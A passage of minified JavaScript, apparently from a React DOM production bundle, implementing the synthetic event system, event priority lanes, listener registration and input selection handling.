t.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var al=null;function Zl(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var ul=null,Kt=null,Qt=null;function Ks(e){if(e=Zn(e)){if(typeof ul!="function")throw Error(S(280));var t=e.stateNode;t&&(t=ao(t),ul(e.stateNode,e.type,t))}}function wa(e){Kt?Qt?Qt.push(e):Qt=[e]:Kt=e}function ka(){if(Kt){var e=Kt,t=Qt;if(Qt=Kt=null,Ks(e),t)for(e=0;e<t.length;e++)Ks(t[e])}}function Ca(e,t){return e(t)}function xa(){}var jo=!1;function Ta(e,t,n){if(jo)return e(t,n);jo=!0;try{return Ca(e,t,n)}finally{jo=!1,(Kt!==null||Qt!==null)&&(xa(),ka())}}function An(e,t){var n=e.stateNode;if(n===null)return null;var r=ao(n);if(r===null)return null;n=r[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(e=e.type,r=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!r;break e;default:e=!1}if(e)return null;if(n&&typeof n!="function")throw Error(S(231,t,typeof n));return n}var cl=!1;if(Je)try{var pn={};Object.defineProperty(pn,"passive",{get:function(){cl=!0}}),window.addEventListener("test",pn,pn),window.removeEventListener("test",pn,pn)}catch{cl=!1}function Bc(e,t,n,r,o,l,s,i,a){var c=Array.prototype.slice.call(arguments,3);try{t.apply(n,c)}catch(g){this.onError(g)}}var En=!1,Nr=null,Or=!1,dl=null,Vc={onError:function(e){En=!0,Nr=e}};function Jc(e,t,n,r,o,l,s,i,a){En=!1,Nr=null,Bc.apply(Vc,arguments)}function Gc(e,t,n,r,o,l,s,i,a){if(Jc.apply(this,arguments),En){if(En){var c=Nr;En=!1,Nr=null}else throw Error(S(198));Or||(Or=!0,dl=c)}}function Lt(e){var t=e,n=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,t.flags&4098&&(n=t.return),e=t.return;while(e)}return t.tag===3?n:null}function Ea(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function Qs(e){if(Lt(e)!==e)throw Error(S(188))}function $c(e){var t=e.alternate;if(!t){if(t=Lt(e),t===null)throw Error(S(188));return t!==e?null:e}for(var n=e,r=t;;){var o=n.return;if(o===null)break;var l=o.alternate;if(l===null){if(r=o.return,r!==null){n=r;continue}break}if(o.child===l.child){for(l=o.child;l;){if(l===n)return Qs(o),e;if(l===r)return Qs(o),t;l=l.sibling}throw Error(S(188))}if(n.return!==r.return)n=o,r=l;else{for(var s=!1,i=o.child;i;){if(i===n){s=!0,n=o,r=l;break}if(i===r){s=!0,r=o,n=l;break}i=i.sibling}if(!s){for(i=l.child;i;){if(i===n){s=!0,n=l,r=o;break}if(i===r){s=!0,r=l,n=o;break}i=i.sibling}if(!s)throw Error(S(189))}}if(n.alternate!==r)throw Error(S(190))}if(n.tag!==3)throw Error(S(188));return n.stateNode.current===n?e:t}function Pa(e){return e=$c(e),e!==null?ja(e):null}function ja(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var t=ja(e);if(t!==null)return t;e=e.sibling}return null}var Ra=ye.unstable_scheduleCallback,Xs=ye.unstable_cancelCallback,Kc=ye.unstable_shouldYield,Qc=ye.unstable_requestPaint,J=ye.unstable_now,Xc=ye.unstable_getCurrentPriorityLevel,es=ye.unstable_ImmediatePriority,Ma=ye.unstable_UserBlockingPriority,Ar=ye.unstable_NormalPriority,Yc=ye.unstable_LowPriority,ba=ye.unstable_IdlePriority,oo=null,Fe=null;function qc(e){if(Fe&&typeof Fe.onCommitFiberRoot=="function")try{Fe.onCommitFiberRoot(oo,e,void 0,(e.current.flags&128)===128)}catch{}}var Le=Math.clz32?Math.clz32:td,Zc=Math.log,ed=Math.LN2;function td(e){return e>>>=0,e===0?32:31-(Zc(e)/ed|0)|0}var ir=64,ar=4194304;function Cn(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Ir(e,t){var n=e.pendingLanes;if(n===0)return 0;var r=0,o=e.suspendedLanes,l=e.pingedLanes,s=n&268435455;if(s!==0){var i=s&~o;i!==0?r=Cn(i):(l&=s,l!==0&&(r=Cn(l)))}else s=n&~o,s!==0?r=Cn(s):l!==0&&(r=Cn(l));if(r===0)return 0;if(t!==0&&t!==r&&!(t&o)&&(o=r&-r,l=t&-t,o>=l||o===16&&(l&4194240)!==0))return t;if(r&4&&(r|=n&16),t=e.entangledLanes,t!==0)for(e=e.entanglements,t&=r;0<t;)n=31-Le(t),o=1<<n,r|=e[n],t&=~o;return r}function nd(e,t){switch(e){case 1:case 2:case 4:return t+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function rd(e,t){for(var n=e.suspendedLanes,r=e.pingedLanes,o=e.expirationTimes,l=e.pendingLanes;0<l;){var s=31-Le(l),i=1<<s,a=o[s];a===-1?(!(i&n)||i&r)&&(o[s]=nd(i,t)):a<=t&&(e.expiredLanes|=i),l&=~i}}function fl(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function Da(){var e=ir;return ir<<=1,!(ir&4194240)&&(ir=64),e}function Ro(e){for(var t=[],n=0;31>n;n++)t.push(e);return t}function Yn(e,t,n){e.pendingLanes|=t,t!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,t=31-Le(t),e[t]=n}function od(e,t){var n=e.pendingLanes&~t;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=t,e.mutableReadLanes&=t,e.entangledLanes&=t,t=e.entanglements;var r=e.eventTimes;for(e=e.expirationTimes;0<n;){var o=31-Le(n),l=1<<o;t[o]=0,r[o]=-1,e[o]=-1,n&=~l}}function ts(e,t){var n=e.entangledLanes|=t;for(e=e.entanglements;n;){var r=31-Le(n),o=1<<r;o&t|e[r]&t&&(e[r]|=t),n&=~o}}var N=0;function La(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var Na,ns,Oa,Aa,Ia,pl=!1,ur=[],ot=null,lt=null,st=null,In=new Map,_n=new Map,et=[],ld="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Ys(e,t){switch(e){case"focusin":case"focusout":ot=null;break;case"dragenter":case"dragleave":lt=null;break;case"mouseover":case"mouseout":st=null;break;case"pointerover":case"pointerout":In.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":_n.delete(t.pointerId)}}function mn(e,t,n,r,o,l){return e===null||e.nativeEvent!==l?(e={blockedOn:t,domEventName:n,eventSystemFlags:r,nativeEvent:l,targetContainers:[o]},t!==null&&(t=Zn(t),t!==null&&ns(t)),e):(e.eventSystemFlags|=r,t=e.targetContainers,o!==null&&t.indexOf(o)===-1&&t.push(o),e)}function sd(e,t,n,r,o){switch(t){case"focusin":return ot=mn(ot,e,t,n,r,o),!0;case"dragenter":return lt=mn(lt,e,t,n,r,o),!0;case"mouseover":return st=mn(st,e,t,n,r,o),!0;case"pointerover":var l=o.pointerId;return In.set(l,mn(In.get(l)||null,e,t,n,r,o)),!0;case"gotpointercapture":return l=o.pointerId,_n.set(l,mn(_n.get(l)||null,e,t,n,r,o)),!0}return!1}function _a(e){var t=kt(e.target);if(t!==null){var n=Lt(t);if(n!==null){if(t=n.tag,t===13){if(t=Ea(n),t!==null){e.blockedOn=t,Ia(e.priority,function(){Oa(n)});return}}else if(t===3&&n.stateNode.current.memoizedState.isDehydrated){e.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Cr(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var n=ml(e.domEventName,e.eventSystemFlags,t[0],e.nativeEvent);if(n===null){n=e.nativeEvent;var r=new n.constructor(n.type,n);al=r,n.target.dispatchEvent(r),al=null}else return t=Zn(n),t!==null&&ns(t),e.blockedOn=n,!1;t.shift()}return!0}function qs(e,t,n){Cr(e)&&n.delete(t)}function id(){pl=!1,ot!==null&&Cr(ot)&&(ot=null),lt!==null&&Cr(lt)&&(lt=null),st!==null&&Cr(st)&&(st=null),In.forEach(qs),_n.forEach(qs)}function hn(e,t){e.blockedOn===t&&(e.blockedOn=null,pl||(pl=!0,ye.unstable_scheduleCallback(ye.unstable_NormalPriority,id)))}function Fn(e){function t(o){return hn(o,e)}if(0<ur.length){hn(ur[0],e);for(var n=1;n<ur.length;n++){var r=ur[n];r.blockedOn===e&&(r.blockedOn=null)}}for(ot!==null&&hn(ot,e),lt!==null&&hn(lt,e),st!==null&&hn(st,e),In.forEach(t),_n.forEach(t),n=0;n<et.length;n++)r=et[n],r.blockedOn===e&&(r.blockedOn=null);for(;0<et.length&&(n=et[0],n.blockedOn===null);)_a(n),n.blockedOn===null&&et.shift()}var Xt=Qe.ReactCurrentBatchConfig,_r=!0;function ad(e,t,n,r){var o=N,l=Xt.transition;Xt.transition=null;try{N=1,rs(e,t,n,r)}finally{N=o,Xt.transition=l}}function ud(e,t,n,r){var o=N,l=Xt.transition;Xt.transition=null;try{N=4,rs(e,t,n,r)}finally{N=o,Xt.transition=l}}function rs(e,t,n,r){if(_r){var o=ml(e,t,n,r);if(o===null)Fo(e,t,r,Fr,n),Ys(e,r);else if(sd(o,e,t,n,r))r.stopPropagation();else if(Ys(e,r),t&4&&-1<ld.indexOf(e)){for(;o!==null;){var l=Zn(o);if(l!==null&&Na(l),l=ml(e,t,n,r),l===null&&Fo(e,t,r,Fr,n),l===o)break;o=l}o!==null&&r.stopPropagation()}else Fo(e,t,r,null,n)}}var Fr=null;function ml(e,t,n,r){if(Fr=null,e=Zl(r),e=kt(e),e!==null)if(t=Lt(e),t===null)e=null;else if(n=t.tag,n===13){if(e=Ea(t),e!==null)return e;e=null}else if(n===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null);return Fr=e,null}function Fa(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Xc()){case es:return 1;case Ma:return 4;case Ar:case Yc:return 16;case ba:return 536870912;default:return 16}default:return 16}}var nt=null,os=null,xr=null;function za(){if(xr)return xr;var e,t=os,n=t.length,r,o="value"in nt?nt.value:nt.textContent,l=o.length;for(e=0;e<n&&t[e]===o[e];e++);var s=n-e;for(r=1;r<=s&&t[n-r]===o[l-r];r++);return xr=o.slice(e,1<r?1-r:void 0)}function Tr(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function cr(){return!0}function Zs(){return!1}function we(e){function t(n,r,o,l,s){this._reactName=n,this._targetInst=o,this.type=r,this.nativeEvent=l,this.target=s,this.currentTarget=null;for(var i in e)e.hasOwnProperty(i)&&(n=e[i],this[i]=n?n(l):l[i]);return this.isDefaultPrevented=(l.defaultPrevented!=null?l.defaultPrevented:l.returnValue===!1)?cr:Zs,this.isPropagationStopped=Zs,this}return U(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():typeof n.returnValue!="unknown"&&(n.returnValue=!1),this.isDefaultPrevented=cr)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():typeof n.cancelBubble!="unknown"&&(n.cancelBubble=!0),this.isPropagationStopped=cr)},persist:function(){},isPersistent:cr}),t}var an={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},ls=we(an),qn=U({},an,{view:0,detail:0}),cd=we(qn),Mo,bo,gn,lo=U({},qn,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:ss,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==gn&&(gn&&e.type==="mousemove"?(Mo=e.screenX-gn.screenX,bo=e.screenY-gn.screenY):bo=Mo=0,gn=e),Mo)},movementY:function(e){return"movementY"in e?e.movementY:bo}}),ei=we(lo),dd=U({},lo,{dataTransfer:0}),fd=we(dd),pd=U({},qn,{relatedTarget:0}),Do=we(pd),md=U({},an,{animationName:0,elapsedTime:0,pseudoElement:0}),hd=we(md),gd=U({},an,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),vd=we(gd),yd=U({},an,{data:0}),ti=we(yd),Sd={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},wd={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},kd={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Cd(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=kd[e])?!!t[e]:!1}function ss(){return Cd}var xd=U({},qn,{key:function(e){if(e.key){var t=Sd[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=Tr(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?wd[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:ss,charCode:function(e){return e.type==="keypress"?Tr(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?Tr(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),Td=we(xd),Ed=U({},lo,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),ni=we(Ed),Pd=U({},qn,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:ss}),jd=we(Pd),Rd=U({},an,{propertyName:0,elapsedTime:0,pseudoElement:0}),Md=we(Rd),bd=U({},lo,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Dd=we(bd),Ld=[9,13,27,32],is=Je&&"CompositionEvent"in window,Pn=null;Je&&"documentMode"in document&&(Pn=document.documentMode);var Nd=Je&&"TextEvent"in window&&!Pn,Ha=Je&&(!is||Pn&&8<Pn&&11>=Pn),ri=" ",oi=!1;function Ua(e,t){switch(e){case"keyup":return Ld.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Wa(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var _t=!1;function Od(e,t){switch(e){case"compositionend":return Wa(t);case"keypress":return t.which!==32?null:(oi=!0,ri);case"textInput":return e=t.data,e===ri&&oi?null:e;default:return null}}function Ad(e,t){if(_t)return e==="compositionend"||!is&&Ua(e,t)?(e=za(),xr=os=nt=null,_t=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return Ha&&t.locale!=="ko"?null:t.data;default:return null}}var Id={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function li(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!Id[e.type]:t==="textarea"}function Ba(e,t,n,r){wa(r),t=zr(t,"onChange"),0<t.length&&(n=new ls("onChange","change",null,n,r),e.push({event:n,listeners:t}))}var jn=null,zn=null;function _d(e){eu(e,0)}function so(e){var t=Ht(e);if(pa(t))return e}function Fd(e,t){if(e==="change")return t}var Va=!1;if(Je){var Lo;if(Je){var No="oninput"in document;if(!No){var si=document.createElement("div");si.setAttribute("oninput","return;"),No=typeof si.oninput=="function"}Lo=No}else Lo=!1;Va=Lo&&(!document.documentMode||9<document.documentMode)}function ii(){jn&&(jn.detachEvent("onpropertychange",Ja),zn=jn=null)}function Ja(e){if(e.propertyName==="value"&&so(zn)){var t=[];Ba(t,zn,e,Zl(e)),Ta(_d,t)}}function zd(e,t,n){e==="focusin"?(ii(),jn=t,zn=n,jn.attachEvent("onpropertychange",Ja)):e==="focusout"&&ii()}function Hd(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return so(zn)}function Ud(e,t){if(e==="click")return so(t)}function Wd(e,t){if(e==="input"||e==="change")return so(t)}function Bd(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var Oe=typeof Object.is=="function"?Object.is:Bd;function Hn(e,t){if(Oe(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var n=Object.keys(e),r=Object.keys(t);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var o=n[r];if(!Xo.call(t,o)||!Oe(e[o],t[o]))return!1}return!0}function ai(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function ui(e,t){var n=ai(e);e=0;for(var r;n;){if(n.nodeType===3){if(r=e+n.textContent.length,e<=t&&r>=t)return{node:n,offset:t-e};e=r}e:{for(;n;){if(n.nextSibling){n=n.nextSibling;break e}n=n.parentNode}n=void 0}n=ai(n)}}function Ga(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?Ga(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function $a(){for(var e=window,t=Lr();t instanceof e.HTMLIFrameElement;){try{var n=typeof t.contentWindow.location.href=="string"}catch{n=!1}if(n)e=t.contentWindow;else break;t=Lr(e.document)}return t}function as(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}function Vd(e){var t=$a(),n=e.focusedElem,r=e.selectionRange;if(t!==n&&n&&n.ownerDocument&&Ga(n.ownerDocument.documentElement,n)){if(r!==null&&as(n)){if(t=r.start,e=r.end,e===void 0&&(e=t),"selectionStart"in n)n.selectionStart=t,n.selectionEnd=Math.min(e,n.value.length);else if(e=(t=n.ownerDocument||document)&&t.defaultView||window,e.getSelection){e=e.getSelection();var o=n.textContent.length,l=Math.min(r.start,o);r=r.end===void 0?l:Math.min(r.end,o),!e.extend&&l>r&&(o=r,r=l,l=o),o=ui(n,l);var s=ui(n,r);o&&s&&(e.rangeCount!==1||e.anchorNode!==o.node||e.anchorOffset!==o.offset||e.focusNode!==s.node||e.focusOffset!==s.offset)&&(t=t.createRange(),t.setStart(o.node,o.offset),e.removeAllRanges(),l>r?(e.addRange(t),e.extend(s.node,s.offset)):(t.setEnd(s.node,s.offset),e.addRange(t)))}}for(t=[],e=n;e=e.parentNode;)e.nodeType===1&&t.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof n.focus=="function"&&n.focus(),n=0;n<t.length;n++)e=t[n],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var Jd=Je&&"documentMode"in document&&11>=document.documentMode,Ft=null,hl=null,Rn=null,gl=!1;function ci(e,t,n){var r=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;gl||Ft==null||Ft!==Lr(r)||(r=Ft,"selectionStart"in r&&as(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),Rn&&Hn(Rn,r)||(Rn=r,r=zr(hl,"onSelect"),0<r.length&&(t=new ls("onSelect","select",null,t,n),e.push({event:t,listeners:r}),t.target=Ft)))}function dr(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n["Webkit"+e]="webkit"+t,n["Moz"+e]="moz"+t,n}var zt={animationend:dr("Animation","AnimationEnd"),animationiteration:dr("Animation","AnimationIteration"),animationstart:dr("Animation","AnimationStart"),transitionend:dr("Transition","TransitionEnd")},Oo={},Ka={};Je&&(Ka=document.createElement("div").style,"AnimationEvent"in window||(delete zt.animationend.animation,delete zt.animationiteration.animation,delete zt.animationstart.animation),"TransitionEvent"in window||delete zt.transitionend.transition);function io(e){if(Oo[e])return Oo[e];if(!zt[e])return e;var t=zt[e],n;for(n in t)if(t.hasOwnProperty(n)&&n in Ka)return Oo[e]=t[n];return e}var Qa=io("animationend"),Xa=io("animationiteration"),Ya=io("animationstart"),qa=io("transitionend"),Za=new Map,di="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function mt(e,t){Za.set(e,t),Dt(t,[e])}for(var Ao=0;Ao<di.length;Ao++){var Io=di[Ao],Gd=Io.toLowerCase(),$d=Io[0].toUpperCase()+Io.slice(1);mt(Gd,"on"+$d)}mt(Qa,"onAnimationEnd");mt(Xa,"onAnimationIteration");mt(Ya,"onAnimationStart");mt("dblclick","onDoubleClick");mt("focusin","onFocus");mt("focusout","onBlur");mt(qa,"onTransitionEnd");Zt("onMouseEnter",["mouseout","mouseover"]);Zt("onMouseLeave",["mouseout","mouseover"]);Zt("onPointerEnter",["pointerout","pointerover"]);Zt("onPointerLeave",["pointerout","pointerover"]);Dt("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));Dt("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));Dt("onBeforeInput",["compositionend","keypress","textInput","paste"]);Dt("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));Dt("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));Dt("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var xn="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Kd=new Set("cancel close invalid load scroll toggle".split(" ").concat(xn));function fi(e,t,n){var r=e.type||"unknown-event";e.currentTarget=n,Gc(r,t,void 0,e),e.currentTarget=null}function eu(e,t){t=(t&4)!==0;for(var n=0;n<e.length;n++){var r=e[n],o=r.event;r=r.listeners;e:{var l=void 0;if(t)for(var s=r.length-1;0<=s;s--){var i=r[s],a=i.instance,c=i.currentTarget;if(i=i.listener,a!==l&&o.isPropagationStopped())break e;fi(o,i,c),l=a}else for(s=0;s<r.length;s++){if(i=r[s],a=i.instance,c=i.currentTarget,i=i.listener,a!==l&&o.isPropagationStopped())break e;fi(o,i,c),l=a}}}if(Or)throw e=dl,Or=!1,dl=null,e}function I(e,t){var n=t[kl];n===void 0&&(n=t[kl]=new Set);var r=e+"__bubble";n.has(r)||(tu(t,e,2,!1),n.add(r))}function _o(e,t,n){var r=0;t&&(r|=4),tu(n,e,r,t)}var fr="_reactListening"+Math.random().toString(36).slice(2);function Un(e){if(!e[fr]){e[fr]=!0,aa.forEach(function(n){n!=="selectionchange"&&(Kd.has(n)||_o(n,!1,e),_o(n,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[fr]||(t[fr]=!0,_o("selectionchange",!1,t))}}function tu(e,t,n,r){switch(Fa(t)){case 1:var o=ad;break;case 4:o=ud;break;default:o=rs}n=o.bind(null,t,n,e),o=void 0,!cl||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(o=!0),r?o!==void 0?e.addEventListener(t,n,{capture:!0,passive:o}):e.addEventListener(t,n,!0):o!==void 0?e.addEventListener(t,n,{passive:o}):e.addEventListener(t,n,!1)}function Fo(e,t,n,r,o){var l=r;if(!(t&1)&&!(t&2)&&r!==null)e:for(;;){if(r===null)return;var s=r.tag;if(s===3||s===4){var i=r.stateNode.containerInfo;if(i===o||i.nodeType===8&&i.parentNode===o)break;if(s===4)for(s=r.return;s!==null;){var a=s.tag;if((a===3||a===4)&&(a=s.stateNode.containerInfo,a===o||a.nodeType===8&&a.parentNode===o))return;s=s.return}for(;i!==null;){if(s=kt(i),s===null)return;if(a=s.tag,a===5||a===6){r=l=s;continue e}i=i.parentNode}}r=r.return}Ta(function(){var c=l,g=Zl(n),f=[];e:{var h=Za.get(e);if(h!==void 0){var k=ls,w=e;switch(e){case"keypress":if(Tr(n)===0)break e;case"keydown":case"keyup":k=Td;break;case"focusin":w="focus",k=Do;break;case"focusout":w="blur",k=Do;break;case"beforeblur":case"afterblur":k=Do;break;case"click":if(n.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":k=ei;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":k=fd;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":k=jd;break;case Qa:case Xa:case Ya:k=hd;break;case qa:k=Md;break;case"scroll":k=cd;break;case"wheel":k=Dd;break;case"copy":case"cut":case"paste":k=vd;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":k=ni}var C=(t&4)!==0,O=!C&&e==="scroll",d=C?h!==null?h+"Capture":null:h;C=[];for(var u=c,p;u!==null;){p=u;var y=p.stateNode;if(p.tag===5&&y!==null&&(p=y,d!==null&&(y=An(u,d),y!=null&&C.push(Wn(u,y,p)))),O)break;u=u.return}0<C.length&&(h=new k(h,w,null,n,g),f.push({event:h,listeners:C}))}}if(!(t&7)){e:{if(h=e==="mouseover"||e==="pointerover",k=e==="mouseout"||e==="pointerout",h&&n!==al&&(w=n.relatedTarget||n.fromElement)&&(kt(w)||w[Ge]))break e;if((k||h)&&(h=g.window===g?g:(h=g.ownerDocument)?h.defaultView||h.parentWindow:window,k?(w=n.relatedTarget||n.toElement,k=c,w=w?kt(w):null,w!==null&&(O=Lt(w),w!==O||w.tag!==5&&w.tag!==6)&&(w=null)):(k=null,w=c),k!==w)){if(C=ei,y="onMouseLeave",d="onMouseEnter",u="mouse",(e==="pointerout"||e==="pointerover")&&(C=ni,y="onPointerLeave",d="onPointerEnter",u="pointer"),O=k==null?h:Ht(k),p=w==null?h:Ht(w),h=new C(y,u+"leave",k,n,g),h.target=O,h.relatedTarget=p,y=null,kt(g)===c&&(C=new 